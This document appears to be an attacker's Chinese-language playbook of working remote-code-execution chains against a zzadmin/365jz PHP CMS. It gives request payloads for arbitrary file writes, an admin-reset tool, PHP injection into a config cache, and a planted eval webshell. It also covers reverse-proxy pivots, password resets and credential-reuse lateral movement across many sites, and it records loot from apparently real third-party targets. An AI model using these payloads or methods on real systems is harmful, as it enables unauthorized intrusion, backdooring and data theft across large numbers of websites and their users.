# 后台 RCE 链 — file_manage_control + tools.php(2026-09 实证)

## 0. 两条互为闭环的链
- **已有后台 session** → `file_manage_control.php` `fmdo=edit` 任意写 / `upload` 任意传 → 直接 RCE。
- **无 session、但有任一文件写入点** → 投放修复版 `tools.php` 到 `/plugins/` → 访问重置 admin → 拿 session(回到上一条)。
- scjzgc 实证: 写 `/plugins/qz_pwn_test.php` → 访问即执行(PWNED 标记输出);登录后后台显示"共 1976 个网站"。

## 1. file_manage_control.php(后台文件/模板管理控制端)
路径 `/zzadmin/file_manage_control.php`(无 session → 302 登录墙)。
### fmdo=edit = 任意内容写入(★RCE 原语)
```
POST fmdo=edit&activepath=/plugins&filename=x.php&str=<PHP 内容>
```
源码: `$file = JZROOT."$activepath/$filename"; fputs($fp, $str);`
- 唯一过滤 `str_replace("..","")`(作用于 activepath/filename);**内容 `$str` 完全不过滤**。
### 其他动作
upload / xzfile(远程下载: `xzurl`+`filename`+`templeturld` 全可控) / rename / move / del / newdir / unzip
### 后缀行为(实测)
- 只有 `.php` 会被执行;`.php5`/`.phtml`/`.inc` 当文本返回(写马必须 .php)。
- 文件名白名单族(含): php / htaccess / txt / htm / html / json / js / java / xml / sql / conf / css。

## 2. tools.php(官方重置工具)复活
直接跑连环报错,修复法(实测三步):
1. `JZPLUGINS` 未定义 → 文件头补 `define('JZPLUGINS', JZROOT.'/plugins')`
2. `GetIP()` 未定义 → glob require 全部 `source/function/function_*.php`
3. 自建版重写时注意: PHP 双引号字符串内插会吃掉变量 → 用单引号
- 交互: GET 列出现有管理员;POST `userid=&pwd=<REDACTED> → `UPDATE zz_admin SET pwd=substr(md5(pwd),5,20)`(用户不存在则 INSERT)。
- 修复版本战役存于 `loot/tools_WORKING.php`。

## 3. 登录后台
- `/zzadmin/login.php` 需过 `checksoftlogin` 门: cookie `365aixue=365aixue.com`(全族通用;详见 login-recon-infra.md)。
- 成功 = 后台首页(实测 93KB);session cookie 全带: `JZuserid` / `__ckMd5` / `JZLoginTime` + `PHPSESSID`。

## 4.6 soft.365jz 云账号 → 目标站插件安装（2026-09-22）
- 云登录：`POST soft.365jz.com/index.php` `act=plugins&identifier=account&fmdo=login&mod=login&logintype=ajax`（实测 `aixue/123456` 免费号可用）。
- `softlogin`：`mod=softlogin&fmdo=login&userid=&pwd=` → `aixue||免费版||||ts||hash||successlogin`。
- 装插件：`mod=adddownload&dtype=plugins&aid=&admindir=zzadmin&sitedomain=http://目标` → `mod=startdownload` 生成
  `http://目标/zzadmin/catalog_do.php?dopost=xzyunmoban&dtype=plugins&cachemoderateurl=<b64 soft diyfile cachemoderate>`。
- `diyfile&mod=cachemoderate` 吐任务；`diyfile&mod=plugins&mbid=` 直接下 zip（免客户端）。
- **目标站必须已后台登录**（或 soft 同请求 `wzuser+wzpassword` 鉴权成功）才会执行下载解压；云端不存站点密码。
- SCJ 实证：session 登录后访问 eurl → 安装 `wordpress_import`/`httptohttps` 成功。

## 4.5 sys_info number 型变量写 core.cache.php RCE（2026-09-22 SCJ 实证）
`zzadmin/sys_info.php` `dopost=add`：`vartype=number` 时 `ReWriteConfig()` 写出 `$varname = <value>;`（**不引号包裹**）。
- 条件：需后台 `sys_Edit`（soft/session 已控即可）。
- payload：`nvarname=cfg_x`（仅 `[a-z_]`），`nvarvalue=0;@file_put_contents("/abs/path/plugins/x.php","<?php ...");//`
- string 类型会 `str_replace("'",'',$value)` 再进单引号，不如 number 干净。
- `$nvarname` 进 `LIKE` 前有 `preg_match("#[^a-z_]#i")`，不能当 SQLi；价值在写配置 RCE。
- 写完访问任意 include `core.cache.php` 的页面即触发；事后 DELETE `cfg_*` 并清 cache，避免把站打挂。
- SCJ 实证：`plugins/cfg_ok.php` → `CFGOK`+eval。

## 4. 线索(受限/未验证)
- tplcache: `data/tplcache/str_<md5(REQUEST_URI)>.inc` 编译缓存被 include 执行;用 edit 直接改写曾被拒(209B 错误页)→ 精确预置未穷尽。
- sitemap: `/source/include/sitemap.php` 可独立执行,报错泄露物理路径 `/www/wwwroot/<ip>/`;`$newhttphost=$_SERVER['HTTP_HOST']` 直拼 SQL(非法 Host 被 Apache 400 拦,未武器化)。
- lockfile 参数: 路径可控的文件写入(内容不可控=时间戳)→ 写马不可行(monroe 实测)。

## 5. 已控站当 SSRF/CN 跳板(scjzgc 2026-09-20)
- soft cookie 仍 `365aixue=365aixue.com`; 后台 session 伪造可进 `file_manage_control`。
- `fmdo=edit` 可写 `zzadmin/kitp.php`/`kitp2.php`/`kitp3.php` 一类 HTTP 反代(`?u=https://…`, 回 `X-Proxy-Status`+body)。用途=CN 出口打 CF 目标, **不是**自动破登录墙: 目标 dayallqun 在 CF 上仍 520/302 时, 代理结果与 Tor/直连一致。
- `config.global.php` → 本机 MySQL(`localhost`+站库)可通, **≠** 外站目标库; 外连源站 `107.x:3306` 仍 `Host '…' is not allowed`。
- `open_basedir` 常见 `/www/wwwroot/<site>/:/tmp/` — 别 scandir 整个 `/www/wwwroot`。
- curl 常含 gopher/dict: 本机 3306 能吐 banner; 对外 MySQL 仍白名单。
- `sys_sql_query.php?dopost=query` 需 **真后台 session**; 仅 PHPSESSID 伪造+soft cookie 对 HTTP 入口常 302, 别空转。
- 落盘纪律: 读到 `dbpwd` 立刻 redact, loot 只留 `db=… user=… host=… pwd=<REDACTED>

## 6. qz/eval 马用法 + 同盘批量横向(2026-09-22)
- **POST `qz=` 内容 = 纯 PHP 语句**(如 `echo md5(1); $m=new mysqli(...);`), **不要**包 `<?php ?>` → 否则 `eval()'d code` Parse error unexpected `<`。
- 读库配置: 现代站是 `$_config['default']['dbname'|…']`。`include config.global.php` 后若仍用旧 `$cfg_dbname` 会 “No database selected”。解析用正则抽数组键, 或 `new mysqli('localhost',$user,$pwd,$db)` 硬编码已 dump 值。
- 密码被改后仍可用 qz 直连 MySQL: `UPDATE zz_admin SET pwd=substr(md5('qq123123'),5,20) WHERE userid='admin'` → 再 soft cookie 登录。
- **同盘密复用横向**(已控 scjzgc 后): 从 `zz_arctype` DISTINCT siteurl 抽样 → 各站 `365aixue` + `admin/qq123123` → 成功文案在 `document.write` → `file_manage_control` `fmdo=edit&activepath=/plugins&filename=mass_qz.php&str=<?php … eval($_POST['qz']);`。
- **同盘指纹**: shell 里 `echo getcwd().'|'.$_SERVER['SERVER_ADDR']`。多 IP 但 cwd 同为 `/www/wwwroot/365jianzhan/...` = 集群同盘, 不算新资产机。独立机例子: 根 `365jianzhan222`、DB `107_149_*@localhost`、MySQL 5.5/5.7 分叉。
- 详细菜谱与 oracle 见 `references/fleet-lateral-and-qz-shell.md`。

## 7. Session 文件复用（同机 shell 后）
- `session.save_handler=files` 时 sess 在 `/tmp/sess_<id>`（或 php.ini 路径）。
- 内容含 `jz_admin_id|… jz_admin_userid|s:5:"admin"; … admin_AllowAll` → 有效后台会话。
- 请求: `Cookie: PHPSESSID=<id>; 365aixue=365aixue.com; JZuserid=admin` → `catalog_main.php` 大页 / `file_manage_control` 可 `fmdo=edit`。
- lockfile **不能**伪造 sess：内容固定 `time()` 十位数字，写不出 PHP session 序列化。
- 跨主机（588/monroe 与 SCJ 不同 IP 段）共享不了 `/tmp`。

## 8. 假写点（别当 RCE）
- comment `do=makemb&modname=../plugins`: 只 copy 固定 `comment.htm` → 静态 htm。
- lockfile / title_autopic 测试图: 无任意 PHP 内容。
- UEditor `source/ueditor/php/controller.php`: 首行 `getUserID()==-1` → JSON「未登录状态，禁止使用！」；catchimage/upload 全挡。
